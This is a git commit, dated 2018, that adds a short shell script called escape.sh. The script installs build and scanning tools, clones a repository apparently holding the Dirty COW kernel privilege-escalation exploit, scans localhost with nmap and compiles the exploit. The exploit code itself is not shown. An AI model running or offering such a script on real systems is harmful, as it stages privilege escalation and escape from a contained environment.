5b84cda0019c6d7b0cb1db243b2bd674693f18c8
lizhi16 <791873122@qq.com>
2018-03-25 16:58:24 +0800

    Add files via upload

---
+++ escape.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+time apt-get install gcc make nmap nasm vim -y
+
+time git clone https://github.com/lizhi16/dirtycow.git
+
+time sleep 55s
+
+time nmap -A -T4 127.0.0.1
+
+time sleep 20s
+
+cd dirtycow && make
